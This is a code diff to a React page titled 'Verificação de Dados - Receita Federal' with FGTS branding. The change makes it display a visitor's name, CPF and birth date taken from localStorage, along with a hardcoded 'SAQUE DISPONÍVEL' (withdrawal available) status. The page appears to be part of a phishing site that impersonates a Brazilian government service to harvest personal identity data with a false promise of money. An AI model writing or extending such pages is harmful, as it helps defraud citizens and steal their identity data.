@@ -4,23 +4,38 @@ import logofgts from "../assets/fgts2.png";
 import flogo from "../assets/f-logo.png";
 import { FaCheckCircle } from "react-icons/fa";
 import { useNavigate } from "react-router-dom";
+import { UserData } from "../types/userData";
 
 export function VerificarDados() {
     const [loading, setLoading] = useState(false);
     const navigate = useNavigate();
 
+    const [userData, setUserData] = useState<UserData>({
+        nome: "",
+        cpf: "",
+        dataNascimento: "",
+        email: "",
+        cep: "",
+        cidade: "",
+        estado: "",
+        rua: "",
+        numero: ""
+    });
+
+    // Carregar os dados do localStorage ao montar o componente
+    useEffect(() => {
+        const storedUserData = localStorage.getItem("userData");
+        if (storedUserData) {
+            setUserData(JSON.parse(storedUserData));
+        }
+    }, []);
+
     useEffect(() => {
         document.title = "Verificação de Dados - Receita Federal";
     }, []);
 
-    // Dados aleatórios para simulação (futuramente substituídos pelo Local Storage)
-    const dadosUsuario = {
-        nomeCompleto: "Victor Silva Santos",
-        dataNascimento: "15/05/1990",
-        cpf: "123.456.789-00",
-        nomeMae: "Maria dos Santos",
-        status: "Saque Disponível",
-    };
+
+
 
     // Função para verificar o localStorage
     const handleConfirmar = async () => {
@@ -43,7 +58,7 @@ export function VerificarDados() {
                 <div className="flex items-center justify-between w-full">
                     <div className="flex items-center space-x-3">
                         <img width={34} src={logo} alt="logo" />
-                        <span className="text-white font-extralight">Olá, VICTOR</span>
+                        <span className="text-white font-extralight">Olá, {userData.nome.split(" ")[0]}</span>
                     </div>
                     <img src={logofgts} alt="fgts" width={65} />
                 </div>
@@ -59,10 +74,9 @@ export function VerificarDados() {
             {/* Informações de Verificação de Dados */}
             <div className="w-full max-w-md bg-white text-zinc-900 rounded-lg shadow-lg p-6 space-y-6">
                 {[
-                    { label: "Nome Completo", value: dadosUsuario.nomeCompleto },
-                    { label: "Data de Nascimento", value: dadosUsuario.dataNascimento },
-                    { label: "CPF", value: dadosUsuario.cpf },
-                    { label: "Nome da Mãe", value: dadosUsuario.nomeMae },
+                    { label: "Nome Completo", value: userData?.nome },
+                    { label: "CPF", value: userData?.cpf },
+                    { label: "Data de Nascimento", value: userData?.dataNascimento },
                 ].map((field, index) => (
                     <div key={index} className="flex flex-col space-y-2">
                         <label className="text-zinc-700 font-semibold">{field.label}</label>
@@ -80,7 +94,7 @@ export function VerificarDados() {
                             Status do Saque
                         </span>
                         <span className="text-lg font-bold text-green-700">
-                            {dadosUsuario.status}
+                            SAQUE DISPONÍVEL
                         </span>
                     </div>
                 </div>
